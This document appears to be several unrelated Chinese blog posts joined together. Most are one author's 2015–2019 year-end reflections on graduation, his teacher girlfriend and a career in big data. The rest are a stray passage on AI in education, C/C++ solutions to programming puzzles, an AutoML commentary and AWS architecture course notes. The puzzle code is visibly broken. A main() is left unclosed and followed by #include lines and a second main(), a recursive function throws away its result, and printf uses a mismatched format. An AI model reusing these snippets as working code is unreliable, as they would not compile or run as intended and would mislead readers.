然而，作为学校和教育培训机构的管理者，不仅要改进和完善现有教育体系，满足学生需求，更要能够预见来自新技术的威胁并及时采取相应的应对措施。未来教师的重复性工作将会被逐渐替代，教师的工作内容也会逐渐改变，管理者要及时改变教师的培训方式。对于教师来说，能够与人工智能系统配合、分析智能系统的数据报告、找到适合孩子的学习路径的技能显得愈发重要。同时，学生的学习心理方面的辅导需求也会越来越多。








 


 
 
七月份写过一篇日志，年终总结我们就从下半年开始吧。
这半年来总的来说，档期很满，所有事情基本按照规划都步入正轨，这让我想起来2013年考研时候教毛中特的包松老师在课程快要结束的时候给我们讲到，你对考研成功有强烈的渴求么吗？强烈到像溺水时候渴求空气一样的强烈吗？我有时候想做一件事情非常强烈的想要把它做成，后来，因为这种渴求，我经常能把一些事情做成功。同学们，虽然这样讲有些唯心主义，但是如果你们真的尝试去这样想，这样渴求，就真的离成果不远了。
 
 
 
你若要为你的意义而欢喜，就必须给这个世界以意义。----------歌德
这是一个酥脆香甜外焦里嫩的菜煎饼
咬下第一口，啊，life，之前你都到哪儿去了？
咬下第二口，这个小摊，冰天雪地的坚持到十一点半给同学们卖宵夜，这是怎样的一种职业操守，而且还支持微信支付，满满的感动！
咬下第三口，2016年之前吃饭大学的书都白念了，未曾吃过如此沁人心脾催人泪下之夜宵，没想到，最难翻越的，是习惯！相信世间所有的相遇都是久别重逢！
爱情使所有的人变成雄辩家，这话说得绝对正确。------罗格林

    张老师给学生讲数学的时候我听过，用的还是比较危言耸听的讲法。我初中的数学老师也和张老师差不多漂亮，讲课也挺好，当年我初中的同学们都很喜欢漂亮的女老师，数学都学的不烂，不知道为啥现在的小孩成天补习数学，所以张老师上课的负担也不小。我曾给张老师不屑的讲，初中题目能难到哪里去，你这交初中岂不是大材小用，结果她发了两道题让我做做，我当然不能给陕西吃饭大学丢脸，果断没做对。想当年我中考数学也只扣了三分，对现在题出这么难表示不理解。。。
    张老师  跟我一块的时候不太能说，主要由我负责指点江山，但是只要在微信里面遭遇，说话肯定一套一套的，俨然一副雄辩家的模样，有时候我根本不知道怎么回答她，只好发去。。。，她依据此引经据典又是一顿侃侃而谈，而且每次不同，小生心里佩服的紧呐。
     张老师作为人类灵魂的工程师，工作辛苦，有时候我去接她下班，一起吃饭，她总是胃口大开，从我们认识到现在她吃饭前都说要减肥说她少吃点就行了让我随便点，我总当她是开玩笑，没有当真，所以我吃完就结账拉她走人的时候也不知为什么张老师总是一脸不悦。直到最近张老师认真起来了，我一吃完，她说你等等，我终于明白张老师是在暗示我，谈恋爱，大家要互相迁就，谁吃的快了，就等一下对方，大家共同成长嘛！
我和张老师彼此相识于学雷锋纪念日，一路走来也有将近两年的时间了，今后的日子还长，我们会共同努力，在不同的战线上为实现共产主义奉献力量。
那天坐滴滴的时候有一个非常有意思的师傅，
我看师傅开的是斯柯达明锐，我说这车好！师傅说不要钱的车最好，我问师傅优步和滴滴哪个好？师傅说不要钱的最好，他说他接到过一单滴滴，12000从西安到天津，我忽然想到这个事儿，可以写成剧本儿拍个公路犯罪类型的电影，然后让滴滴打车植入广告一定大卖！我跟师傅一路走一路聊，张老师就在一边傻笑，现在期望司机师傅能开慢点，好让我们几个的欢乐能够得以延续，想到那天小米开年会，老总雷军说，一五年，他们太关注，手机出货量，你整个公司上上下下都背上了沉重的包袱过的一点儿都不欢乐，2016年要把，重心重新关注到手机的电量系统、拍照等细节问题上，带着使命感把这些问题解决好，重新回到为发烧而生的道路上来。
我想我们这个年纪的人多少需要在自由和责任中，做出一个去选择，是追随自己的内心，还是向现实妥协,，选择什么都没有错，不过既然已经选择了，不如让他欢乐一些，你饿不？，我去给你煮碗面

致谢
生活处处有惊喜，希望16年还能继续惊喜下去，感谢这一年来我的努力，张老师的支持，朋友们老师们的关照。
 
后记--
朱光潜在《谈文学》中对于如何做文章讲到：
你不肯用俗滥的语言，自然也就不肯用俗滥的思想感情，你遇事就会朝深一层去想，你的文章就不致落入下乘。现在马上毕业了，马马虎虎的走完了学业生涯，对自己一直要求不高，希望在后续走入社会的过程中，对于自己凡事严格要求，取法为上，仅得为中，取法为中，故为其下，与各位共勉。
 











绪论
2016年的生活有些忙碌，到年底一整年连续的日子成了离散的关键词。2015年这个时候，我还在学校深更半夜因为一个菜煎饼感动的痛哭流涕，一转眼2016年都要过完了。

江湖有江湖的道义，武林有武林规矩，洒家的2016罗列如下：

老张是个好老师
与老张恋爱三年有余，彼此互相包容忍让，共同进步，谁不会闹点小误会呢？毕业那会，正处多事之秋。几年的好哥们，都将去各处远行，心中有些酸楚。彼时又和张老师闹了别扭，一气之下几天没吱声，现再回想起来这是非常不负责任的，在此向老张再次郑重道歉。张老师工作辛苦，你可能要说这年头哪还有容易的活啊。然而作为人类灵魂的工程师，如果是我去教初中数学，面对一个1/2不知道等于0.5的初中生，可能真的忍不住要爆粗口甚至动手削那些熊孩子。而老张呢，虽然威严不减也还是不紧不慢的悉心指导，末了还要应付熊孩子的家长们。
有好几次，我都觉的有点过分。一点多了老张还没吃饭，打电话过去发现张老师依然在和家长沟通学生的情况。一个在老师饭点还冷怂给老师倾诉自己小孩怎么都学不进去不知道咋办的家长可能真的要反思一下，娃学不进去是不是自己的问题。
我们可敬的张老师当然和我不一样，每当出现这样的坑货家长，她都会不厌其烦的帮助她们分析总结，宁可自己饿一会，也会安抚好家长，找到解决问题的办法。人常说，教师是神圣的职业，但教师也是人，老张却用行动诠释了，什么是师者所以传道授业解惑也，不但给学生授业，也给家长解惑。
在此，致敬所有老师！
在此，借用***情书的结尾，吻你万千。

毕业是一件大事
毕业是一件大事，分别也是一件。离校最后的两天宿舍挨个放空，我有些不舍，于是挨个拥抱了所有同学（女）又开车回去游了几回泳，最后送走了大飞，才算离开学校，一脚踏入现实的泥潭。
回想老郑走的时候，山东大汉偷偷掉了眼泪，他说你可别笑话我。“西安这么好，别走了吧”，我告诉他。可他听了之后还是头也不回的去检票了，还撂下一句：你们回吧。林总和老王走的时候就没这么多痛苦。因为以后和老王聚的时候还多，结果到现在也没聚过一次。林总一想到深圳离卅城就两站路，就开心的浑身热血沸腾，一溜烟上了头班616拍马而去。黄兄要南下蜀地，后来多次沟通工作上对IT个大领域的发展畅想，黄兄想法见地之深刻令人耳目一新，这年头敢唱衰大数据的人不多，黄兄算是有理有据的一个。
抱道不曲，拥书自雄，与诸位同学共勉。


大数据时代的思维转变
毕业后没想到阴差阳错的进入了大数据处理领域，才发现在视觉领域浸泡许久，思维和大数据处理上截然不同。视觉上的处理要求精确，单机高效，并行，更多是因果关系，图像中出现了人，因此有人脸，从而有人脸识别，从而有表情识别。而大数据条件下更多是要求关联关系，只要发现了两个现象之间存在显著的相关性，就可以创造巨大的经济或者社会效应，比如Google通过追踪大量用户搜索流感字样的人群位置，做出了流感的趋势预测。

唱衰大数据
Susan langer 在《哲学新视野》一书中说：某些观念有时候会以惊人的力量给知识状况带来巨大的冲击。由于这些观念能一下子解决许多问题，所以，它们似乎将有希望解决所有基本问题，澄清所有不明了的疑点。每个人都想迅速的抓住它们，作为进入某种新实证科学的法宝，作为可以用来构建一个综合分析体系的概念轴心。这种‘宏大概念’突然流行起来，一时间把几乎所有的东西都挤到了一边。
大数据时代，大数据这一手段俨然成为了一种万能工具，我们今天在这里就是要唱衰大数据，因为越是万能的，就越是空洞的。
大数据的核心是预测，如果不能进行预测，仅仅进行简单的数据统计分析，那么和传统的领域我认为是没有区分开的，从事这样的行业价值不大，当今大数据框架之成熟解决方案之完备，完全可以让一个没什么计算机经验的高中生经过几个月的培训就接手各种修改配置的部署工作中去，CDH，zookeeper，hue等等管理框架又都提供了图形化管理的界面，如今各大开源社区的贡献已经让尽可能多的人成为了大数据行业中的价值制造者，那么从事大数据行业的人还有什么可以深入发掘的点呢？
大数据人才大致可以分为以下三个方向：

偏重基建与架构的大数据架构方向。
偏重建模与分析的大数据分析方向。
偏重应用实现的大数据开发方向。

机遇与挑战似乎一直存在，你能找到他们么？

老王和他的IT界朋友们
工作不多时来到北京，借此有机会看望了IT界的名企大牛同学们（时间有限BAT,GOOGLE等还没走完），虽然都身在新闻联播的帝都里，幸福像花儿一样，然而漂泊本无根，几年过去了，大家都没怎么变化，这又让我想起一句诗：人面不知何处去，桃花依旧笑春风，诸位累了就回西安吧。




逃离北上广，我们有情怀的雷总在西安迎接大家，有留迹，让故事留在他发生的地方.


帅不帅，留给别人去评判，反正天下我最帅！
2016年是我准备开始运营《老王和他的IT界朋友们》这个品牌的开局之年，感谢各位亲朋好友的支持，公众号至今为止以有208位粉丝，他们不属于IT界，就一定是IT界的朋友。书上说做人得要有：高远意志，平宽心情。我们这个小圈子一定会竭尽全力带领各位实现目标，剖析自己，送上更多的人文关怀。

后记
2016年已经离我们远去，世事尽管有些未尽人意，您可千万别灰心丧志。挫折如火，劫难如焚；火能焚木为灰，却能炼铁成钢！
最后祝大家新年快乐



欢迎关注公众号：老王和他的IT界朋友们






















2017年钟声敲响的时候，人们总是习惯于性质勃勃地写下一张全年的to do list：例如读完800本书，买个大房子等等。立志之后，就陷入到忙忙碌碌的新一年中，上班扎进电脑和手机，下班一头扎进被子，直到猛一抬头发现2017年只剩几天。。。

十八般武艺 VS 亢龙有悔
矛锤弓弩铳，鞭简剑链挝，斧钺并戈戟，牌棒与枪杈
古语有云：有志者立常智，无智者常立志。随着现代社会的迅速变化，立常志变得几乎不可能，更多的情况是你的理想需要随着现实情况的变化而做适当的调整。但即便如此，我还是认为需要一个相对恒定的理想。不忘初心，是整个国家，社会对于回归纯粹生活的热切期望。
工作一年半以来，由于单位没有互联网，手机俨然成为了我躯体的又一器官。当我发现手机严重影响 我的专注度和思维能力已经 为时过晚。远离手机的时间，大脑通过冥想可以将一些看似没有太多关联的事情联系起来。所以当我和任务独处的时候我能感觉到和整个宇宙都在产生联系，但是当手机加入，就只有我和手机了。 
自媒体的迅速发展，既容易造成注意力的集中，也容易造成注意力的消解，使人们对需要严肃对待的事情越来越缺乏耐心，面对铺天盖地的信息，往往需要耗费大量时间甄选有用信息 ，本来是打开手机搜索一个问题，由于顺道开了微信，刷了一圈朋友圈八卦，又顺道看了两篇公众号文章，而忘了自己原本要打开手机的目的，长此以往根本没法集中注意力，干什么都不专心，做什么都delay，当今社会犯错成本太高，我们还是需要小心翼翼，千万不要养成时不时看手机的毛病而误了大事。
两弹一星元勋科学家钱学森出身书香门第，他不但学贯中西更是精通琴棋书画，1935年，24岁的钱学森甚至还发表过一篇题为《音乐与音乐的内容》的论文。看来天龙八部中聪辩先生苏星河精通琴棋书画，却不擅长武学，因花太多时间于杂学之上，并未学会逍遥派太多高深的功夫，他有点像我现在的状态，在技术上缺乏一个focus 的点，郭靖大侠当年将一招亢龙有悔使到极致照样威震武林，当然他也可能还是天赋有限。我也天赋有限，工作生活中还是要保持专注度，远离手机，保持纯粹的追求，也许总有一天，自己也能十八般武艺样样精通，成为一代全栈程序宗师。

 天下攘攘皆为利往
以下一个小节完全转载自，安晓辉《 程序视界》

很多开发者追逐 AI ，也是从这点出发，为了自己更好的未来。但实际上，趋势并不属于每个人。它往往属于那些已经为这个趋势做了很多年准备的人。
你必须知道的是，现在 AI 趋势里风生水起的专家、科学家、公司，哪个不是之前已经在相关领域做了很多年的研究？
如果你只是看到趋势就盲目扑过去，往往沦为跟风，甚至会跟丢，跟来跟去找不到自己的位置。所以，如果你决定要跟，也要了解怎样去跟。
人工智能开发的四种类别

最后，提醒一下，并不是每个程序员都要追逐人工智能软件开发这个浪潮。软件开发的方向很多，应用场景也很多，你有非常大的可选择余地——只要你能成为你所处领域的局部头部，你就会拥有很多机会。而如果缺乏成为头部的思维、能力和行动，不论去追赶什么浪潮，结果都只能是望洋兴叹。

参考这篇安大神的文章分析，我可以有一个简单的判断，从现在做起还不算晚。 
http://mp.weixin.qq.com/s/TdG3ML195g55hD9a9UuxcQ 
(以上内容转自上述链接)

我一直追寻着你心情的足迹
张老师的小学教师生涯并不是一副歌舞升平的盛世景象，她有时候甚至问我：自己是不是适合教师这个职业。家长到处范二，练习册丢了问老师，作业布置的啥问老师，恨不得把老师当成7*24小时不间断服务的人肉机器人，问的时候还不加敬称，你你你的呼来唤去。我看了心里都很不爽，张老师还是不卑不亢的耐心回答，就评这一点小张就应该获得优秀教师勋章。
国家说要提高基层教师工资待遇，喊了很久，张老师也没涨工资。大学教授一个月1w7带两三个研究生天天给自己报销发票有几个真正推进了我国现代化进程的进步？小学幼儿园初高中老师一个月几大千一人带80多个祖国的花朵，拿着卖白菜 的钱操着卖白粉的心。谁手中掌握着祖国的未来？多劳多得按劳分配也应该给她们涨涨工资。
记得有一次和高指导聊天龙八部，发现金庸竟然在新版改了结局，知乎上有人说，更相信王语嫣和段誉仍然是一对。后来长大后便慢慢醒悟爱情的意义。明白了金老先生的深意。其实木婉清刚出场那时，已经折服了多少人的心，他和段誉本是良偶，于是王语嫣与我，从神仙姐姐，变成了岳灵珊、变成了周芷若。
和张老师的爱情长跑将近1400多天，我们已经有了明确的人生规划，在人生大事上基本达成了共识，爱情在我们两个人的生活当中产生了微妙的变化，好像慢慢的在向柴米油盐等琐碎的事情上迁移，张老师批评我说热恋还没完，怎么就要开始准备结婚了。说起来万分惭愧，是这一年来我因为工作的原因聚少离多，给她的惊喜太少了吧。
特别感谢小张老师，她是一名优秀的产品经理，经常能敏锐且毫不客气的指出我的不足，更难得的是她胃口很好，哈哈

任何事情要做好且做爽，必然是内驱的
2015年的关键词：少说多做 
http://blog.csdn.net/wangyaninglm/article/details/50640972 
2016年的关键词：努力，奋斗 
http://blog.csdn.net/wangyaninglm/article/details/53959333 
2017年中的关键词：让我们一起为梦想窒息！ 
http://blog.csdn.net/wangyaninglm/article/details/74612482
过去的时间我基本保持 ，每半年更新一篇总结过去，展望未来的文章，2016年底我希望自己能够成为大数据全栈工程师，还顺道唱衰了一下大数据觉得大数据什么的都是使用开源的产品，一年过去发现，好家伙用开源产品也得知道怎么用数以万计的api呀，hadoop生态圈十几二十个产品真不是盖的。和圈内专家聊了两句就露馅，人家说，您这就不叫大数据研发，充其量就是使用开源组件—-而已！
所以这半年比较尴尬，甚至没有一个可以写到简历上用来show 的项目。代码没写过多少，淡是越扯越好了。 
想起csdn专家群里一个专家总结最近面试人的经历，大多数是：一问三不会，开口十几k 
我呢？开不了口。。。
总结总是有喜有悲的，在单位，吃了个饭，睡了个觉，出了个差，半年过去了。这些时日我总发现自己穷的很，不单单是物质层面上的，更是精神上的穷。
造成这种身心惧穷的根本原因是基本上把钱看的比什么都重要，做事情的时候我会不自觉的去衡量事情的金钱价值，而真正应该 有的态度是首先把事情做好，顺便赚钱。至少冯仑说李嘉诚是这么认为的。
工作说完了，咱们再来聊聊人生有何意义？胡适先生说，科学家是为求真理。庄子虽有“吾生也有涯，而知也无涯，殆已”的话头，但是我们还是要向上做去，得一分就是一分，一寸就是一寸，可以有阿基米德氏发现浮力时叫Eureka   的快活。有了这种精神，做人就不会失望。所以人生的意味，全靠你自己的工作；你要它圆就圆，方就方，是有意味；因为真理无穷，趣味无穷，进步快活也无穷。
记得前段时候有一篇文章说第一批九零后已经秃了，当然没有人能躲过生活，只不过现在轮到90后，罗曼罗兰曾说过，世界上只有一种真正的英雄主义，那就是在认清生活的真相后依然热爱生活。
共勉！

特别鸣谢

小张老师
胡适先生
《人人都是产品经理》
《黑客与画家》
安晓辉 《程序视界》


All Rights Reservered

注： 
在大型组织内部，有一个专门的术语描述这种跟随大多数人的选择的做法，叫做“业界最佳实践”。 









文章大纲看图说话----序西安公司杭州总部上海BMS 学习出差路上阶段性成绩技术积累身体健康消费支出那些年我写过的总结

看图说话----序
2019年是学习节奏缓慢的一年，生活工作中会遇到很过破事，处理不好就会让人放慢节奏，想要的太多，诱惑也太多，难免堕落。蒋方舟说，人一旦堕落哪怕是短暂的几年，上帝就会以更快的速度收走你的天赋与力量。人常说30而立，立不住，那就保持简单，保持移动。人常说不能老呆在舒适区，那是因为，你怎么知道没有一个更舒适的地方在等你呢？
这篇文章大部分都是图，大家做好心理准备。
新年伊始祖国大好河山，我喜欢登山，因为山高人为峰，让人很有成就感。

回母校，清华桥上我想起了曾经吃饭大学的食堂。

动态血糖仪测试，亲身试验，陕西人吃面不能太多，吃完再喝一碗面汤，那血糖飙升到12 -345 ，简直不能太危险。遂自学加百度，写下了这篇博文：
连续血糖监测(CGM) 初探

陕西人的最爱，扯面，108合一

见识我爷的勋章，共和国大庆，老爷子全国劳模，也是深藏功与名，那个年代的人，需求简单，不求闻达于诸侯，国家人民需要的，就是我需要的。
这个年代的我想法太多，行动太少。。。。

见识了国家健康医疗大数据中心，惠民惠企惠政惠医，这十几个大屏展示效果真是刚刚的。


西安公司
公司在21楼，楼上的风景很好，边上还有公园，吃完饭没事的时候可以去遛弯。
在公司从早到晚，我在这里的时光多于陪我媳妇。


西安近些年来，污染严重，不知为何一直不能解决。每每冬天雾霾，我总想起火星救援里面的台词：I’m the first person to be alone on an entire planet.



公司边上的云水公园，除了冬天，其他时候景色宜人，中饭后，常来遛弯消食，路上针砭时弊，留下很多美好的记忆。





杭州总部
杭州总部在钱塘江边，风景也很好，加班完，晚上还可以去钱塘江边跑步，不过杭州总下雨。如果加班太晚，晚上也没有力气。
公司总部挂了很多许老师的"世界名画" 这张简直精髓，我忍不住cosplay 一下。

杭州卫生 信息中心学习

公司的，早上，傍晚和午夜。



钱塘江边小跑一次，发现似乎宝刀未老，锻炼是重在坚持。
每天锻炼30分，
健康工作100年，
向天再借500年，
还完房贷，
幸福生活一辈子。


开完年会，我们去钱塘江边喝酒。

杭州市政府吃了个爆甜的句子----爆橘


上海BMS 学习
为啥单独把这个列出来，因为这个公司高端到，两个中国人面对面开会，都不想说中文，因为还有全球的研发中心在听。


出差路上

2019年飞了18次，每一次出差都是对心灵的考验。还好目前都是短差。我还挺喜欢这种新鲜的感觉。
偶尔换换地方生活也不错。





阶段性成绩
生命即将迈入奔四，尤其35岁，是技术人的分水岭。
35岁，对于很多工程师而言是个坎，很多工程师懒得搞技术了，就另谋生路去做产品、售前和项目管理，现在只有云计算售前有行业红利，收入暂时高的惊人；而产品经理是在职场冒险，项目管理一直是苦力活。这些另谋生路的朋友，长期看还不如固守IT技能的基本盘。
35岁的裁员潮，其实被淘汰最多的不是干活的工程师，而是基层管理岗位。如果是带头干活的组长经理，就算被裁了还能找到工作；老工程师不能和应届生拼手速拼加班强度。
计算机有很深的理论体系，这是我们这些老工程师构筑经验壁垒的好机会，这套润物无声的理论体系，怎么沉浸下来进入自己的体系呢，写写博客，写写代码，多积累，唯手熟尔。
技术积累
开博10年，总体还算是说的过去，期待能有厚积薄发的那一天。希望 我的2020年能够完成《自然语言实战入门》这个课程的总体ppt 以及视频、博客。
付费专栏：自然语言处理实战入门
付费单篇系列：自然语言处理实战
视频课程：自然语言处理实战入门
免费专栏：简单NLP分析套路
目前，主要是在csdn 上面发发，今年尝试将一些干货写成付费的，发现还是看的人少，可能水平有限吧，后面我还是得坚持下去。很多平台都设置了可以同步，这个功能很好，懒得复制粘贴了。



身体健康
尝试了一下 健身房的健康指数测量器，还有美年大健康的体检。主要就是几个原则：
少熬夜，多运动，戒烟限酒，保持积极的心态，说着容易，做到那那么容易

消费支出
看来主要支出都是倒腾还房贷了。支付宝绑了，信用卡，这俩消费有重叠



最后放一张杭州的广告牌，共勉




那些年我写过的总结
10年IT路，我从大约10年左右开始写年终总结，那时候的文章太矫情，而且透露出与年龄不相符的沉闷，一路走来，我改变了很多，但有一点没有改变，那就是前进的动力。
2013年年中的关键词：生活

我所理解的生活

2013年年底的关键词：温和的坚持，并且傻笑

草稿2013
As time goes by

2014年年中的关键词：世间的事大抵如此

吴家坟女子专修学院郭杜校区计算机分院的学年总结

2015年年中的关键词：earning my living，burning my soul

年少成名的我并没有放弃自己，谁敢说她\他文章比我写的好？！，不服来战！

2015年的关键词：少说多做

2016依然会给我惊喜，谢谢

2016年中的关键词：毕业

从前有一个程序员，成天写代码，后来，他屎了。。。

2016年的关键词：努力，奋斗

2016年简直一晃而过

2017年中的关键词：让我们一起为梦想窒息！

我要用生锈的机关枪击穿现在

同期工作一年后对考研的回顾：

考试，一种严格的水平鉴定方法。

2017年底的关键词：不断前进，永不回头

2017,业界最佳实践

2018年农历新年：只要思想不滑坡，办法总比困难多！

因为我梦见了热情的梦

2018年 研究所离职：费解

IT从业者国企生存指南

2018年 年中：人生大事

结婚是一件人生大事

2018年底：成为一名优秀的程序员

2018 初入IT十年（上）----成为一名优秀的程序员

2019年：视线所及只剩生活

2019 初入IT十年（下）---- 视线所及只剩生活











题目：
讨论帖：
点击打开链接


int main()
{
switch (getchar() - '0')
{
case 2: puts("3"); break;
case 3: puts("25"); break;
case 4: puts("253"); break;
case 5: puts("3121"); break;
case 6: puts("46651"); break;
case 7: puts("823537"); break;
case 8: puts("16777209"); break;
}
#include <stdio.h>
#include <math.h>
size_t apple(size_t b)
{
    return b>0?pow(b,b)-(b-1):0;
}
int main()
{
    printf("%d\n",apple(8));
    return 0;
}



void apple(short bear, short apple_sum, short count){
	if(count == bear){
		return;
	}
	apple_sum += pow(count,count) - count + 1;
	count++;
	apple(bear, apple_sum, count);
}
2.
讨论帖子：
http://bbs.csdn.net/topics/391830032


void print(vector<char>& vData)
{
vector<char>::iterator it = vData.begin();
for(; it != vData.end(); it++)
{
if(*it == '0' || *it == '2' || *it == '3' || *it == '5' || *it == '6' 
|| *it == '7' || *it == '8' || *it == '9')
{
cout<<" - ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"   ";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '4' || *it == '8' || *it == '9')
{
cout<<"| |";
}
else if(*it == '5' || *it == '6')
{
cout<<"|  ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"  |";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '1' || *it == '7')
{
cout<<"   ";
}
else if(*it == '*')
{
cout<<"*";
}
else
{
cout<<" - ";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '6' || *it == '8')
{
cout<<"| |";
}
else if(*it == '2')
{
cout<<"|  ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"  |";
}
}
cout<<endl;
for(it = vData.begin(); it != vData.end(); it++)
{
if(*it == '0' || *it == '2' || *it == '3' || *it == '5' || *it == '6' 
|| *it == '8' || *it == '9')
{
cout<<" _ ";
}
else if(*it == '*')
{
cout<<" ";
}
else
{
cout<<"   ";
}
}
cout<<endl;
}

int main()
{
int n, i, k;
while(cin>>n)
{
i = 2;
if(n < 2)
continue;
vector<int> vData;
while(n >= i)
{
if(n % i == 0)
{
n = n / i;
vData.push_back(i);
}
else
{
i++;
}
}

vector<char> vRes;
int vDataSize = vData.size();
for(k = 0; k < vDataSize; k++)
{
stack<int> temp;
while(vData[k] > 0)
{
int value = vData[k] % 10;
temp.push(value);
vData[k] /= 10;
}
while(!temp.empty())
{
vRes.push_back(temp.top() + 48);
temp.pop();
}
vRes.push_back('*');
}
if(!vRes.empty())
{
vRes.pop_back();
}

print(vRes);
}
return 0;
}

﻿﻿
﻿﻿









作者：一人

Featuretools如你所言能够自动完成特征工程，它属于AutoML范畴，接下来我还是主要谈AutoML1吧。由于机器学习应用高门槛和应用范围的广阔，所以很多组织于2017和2018年开始自动化的机器学习尝试，想降低机器学习应用的门槛，让非专业人员也能够应用。机器学习的工作流通常为数据清洗、特征工程、模型选择、模型训练、模型评估，针对机器学习的自动化尝试，也在这几个步骤展开。
由于数据清洗和数据强关联，在这一部分只能根据具体应用和情景进行处理，无法抽象出来使用通用方法解决；针对特征工程部分，据我查阅所看，自动化工具很少，Featuretools算是一个吧；但是针对后面模型选择与模型训练、模型评估的自动化工具就比较多了，例如Google的automl,Microsoft的NNI2以及autosklearn3等。
当前自动化的工具主要根据机器学习算法分为两个类别4：
自动传统机器学习方法与自动神经网络方法。自动传统机器学习方法最为典型的应用就是auto-sklearn，面向的算法主要是LR，SVM，GBDT等。而针对自动化神经网络的工具当前处于研究的前沿，具有代表性的工具除过上面google和Microsoft之外还有auto-Keras,百度的AutoDL等，由于神经网络能够自动化完成特征工程，因此所有的工具都主要集中在网络架构和参数搜索上了。
automl从2017年开始引起关注，2018号称automl的元年，由此也能看出来其离实际应用还有比较长的距离。虽然如此说，但是针对传统机器学习的自动化工具现在还是值得尝试。
传统机器学习方法已经发展很多年了，针对这部分自动化工具也诞生有些年头了，auto-sklearn已4年。但是很不幸，据使用过的人说，效果还是比较有限，不如人工做出来的效果好，如果对于效果要求不很高，不妨试试，毕竟构建快成本低。自动神经网络就不用在说了。从目前发展状况来看，短期内这个领域应该不会有什么大的突破，但是长期看自动化机器学习还是很有前途的。
如果要想进一步了解AutoML的内容，可以查看zhihu中automl话题下的讨论，https://www.zhihu.com/topic/20173754/hot

机器学习技术落地难，急需懂算法的产品人员。
算法工程师从业人员已经饱和。学习资料易得，学习门槛降低。还记得在2016年底时我们俩谈过：由于现在的各种教程漫天飞，这个领域必将涌入大量的从业人员。
从近两年发展来看现状确实如此，去年校招的很多报道说：算法岗收到的简历与职位的比例远远大于100:1，各大公司现如今对于算法工程师的门槛要求也是水涨船高，高的我看见都发怵。机器学习在产品上的应用远没有想象的那样迅速铺展开来，新进入人员没有新坑能占。当前机器学习应用比较广的领域：

图像的监控与文字识别，
NLP的智能助手与智能客服；
推荐、搜索、广告系统等。

这些都是发展很多年的领域并不新，所以也就没有新的岗位创造出来，进一步加深了行业人员的饱和。因此，当前行业并不缺懂算法的工程师，或者说并不缺初中级算法工程师。
急需能够让算法落地的产品人员。不用质疑机器学习的应用范围是很广的，但是应用的落地速度并不如预期，这在一定程度上反应出来：算法人员不懂产品，产品人员不懂算法。这种隔阂才是算法不能迅速落地的关键因素。
所以，如果在这个方向的从业人员应该多多将精力放在如何填补这鸿沟上，要么产品人员多学学算法，要么算法人员多多了解产品知识。
个人观点：能够掌握主流的算法原理，有两三个算法实际项目，能够掌握产品方面的技能，这种人才才是当前的香饽饽。



机器之心，AutoML、AutoKeras…这四个「Auto」的自动机器学习方法你分得清吗？https://zhuanlan.zhihu.com/p/49494212 ↩︎

Microsoft, NNI,  https://github.com/Microsoft/nni ↩︎

Machine Learning Professorship Freiburg, Auto-sklearn, https://automl.github.io/auto-sklearn/stable/# ↩︎

第四范式，AutoML在推荐系统中的应用，https://zhuanlan.zhihu.com/p/52907645 ↩︎













文章大纲Aws 的优势架构完善的框架（WAF）

Aws 学习笔记
Aws架构中心
Aws 的优势
4.速度优势
5.全球优势
数分钟内实现全球部署
Aws全球基础设施
Aws 数据中心
来自多家ODM（白牌机器）
1.考虑当地法律法律法规
2.考虑速度，和用户的距离，是否提供对应的业务
3.考虑成本
Aws 可用区
每个区由一个或者多个数据中心组成
专为故障隔离而设计
使用高速专用链接与其他可用区域互联
您可以选择可用区
Aws建议跨可用区复制以便实现弹性。
Aws 边缘站点协助客户实现高可用、高响应
架构完善的框架（WAF）
5大支柱：
1.安全性
2.可靠性
3.成本优化
4.性能效率
5.卓越运维
安全性
身份机制
实现可追踪性
在所有层确保安全性
风险评估与缓解策略
可靠性
动态获取计算资源以满足要求
成本优化
衡量效率
消除不必要的支出
考虑使用托管服务
卓越运维
能够运行和监控各种系统
持续改进支持流程和程序
部署方式
更新方式
操作方式
性能效率
选择有效的资源并在需求变化时保持资源效率
普及先进技术
了解技术


20191017 下午课程 aws 简单架构
Aws s3
Amazon s3 对象存储（扁平化，对象，元数据）
设计为提供99.999999999%的持久性（9个九+2个九= 11个九）
事件触发器
静态网站托管
S3访问控制
S3 使用案例
计算和大规模分析的的数据存储
限制：上传5G，存放5T
版本控制
备份工具
Aws Glacier
右上角换成amazon s3 智能分层
EC2 添加计算功能
使用amazon 系统镜像AMI 启动 Amazon EC2 实例
自定义启动配置的相关组件
EC2 和数据存储
EBS 弹性实例存储
实例存储是临时性的
跨可用区的数据复制要收钱，快照是可以复制。
跨可用区复制。
先对卷做快照-实际上是在s3上面，在另一个可用区用快照恢复
用户数据及实例元数据
https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
EC2 实例类型
EC2定价选项
会话处理放在外部，ec2只是一个计算的模块。
架构一定是无状态的。
EMR按需结合竞价来做.任务可以提前完成而且成本更低。
标签最佳实践
添加数据库层
选择什么样的数据更适合什么样的场景
数据库层的选择注意事项
关系型与非关系型数据库对比
Oracle 大部分扩展是用垂直扩展，mysql 支持水平扩展
事务查询用关系型数据库。
Nosql 天生支持水平扩展形式
amazon aurora
老师强烈推荐了 amazon aurora 是自己提升了性能，并开始将自身的Oracle逐渐下线改为amazon aurora
Amazon DynamoDB
以购买火车票场景为例
查看余票：最终一致性
下单：强一致性
为什么有这两个区别：
CAP原则又称CAP定理，指的是在一个分布式系统中，一致性（Consistency）、可用性（Availability）、分区容错性（Partition tolerance）。CAP 原则指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。
数据库的安全管理
RDS
DynamoDB
数据库的迁移

20191018 早上课程 网络
云中的安全性
链接网络
虚拟私有网络
VGW需要购买
Aws Direct Connect
多个vpc 互联互通

20191018 下午课程
AWS 负载均衡器
高可用
多区域高可用及DNS
Aws Identity and access management
弹性高可用和监控
弹性
高可用
监控
CloudWatch
获得弹性并扩展架构

20191019 上午课程
实现基础设施自动化
Aws CloudFormation
可以直接托拉拽的设计方式
